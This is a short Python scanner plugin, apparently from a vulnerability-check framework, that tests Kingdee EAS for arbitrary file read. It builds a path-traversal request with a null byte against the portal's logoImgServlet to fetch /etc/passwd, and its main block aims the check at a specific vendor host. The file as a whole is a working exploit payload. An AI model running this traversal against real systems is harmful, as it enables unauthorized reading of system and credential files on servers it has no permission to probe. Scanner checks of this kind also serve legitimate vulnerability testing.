#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:金蝶EAS任意文件读取
#Refer:http://www.wooyun.org/bugs/wooyun-2015-096179

def assign(service,arg):
    if service=="kingdee_eas":
        return True,arg 
    
def  audit(arg):
    url=arg+"portal/logoImgServlet?language=ch&dataCenter=&insId=insId&type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "bin/bash" in res:
        security_hole(url)
    
if __name__=="__main__":
    from dummy import *
    audit(assign('kingdee_eas','http://easshow.kingdee.com:7896/')[1])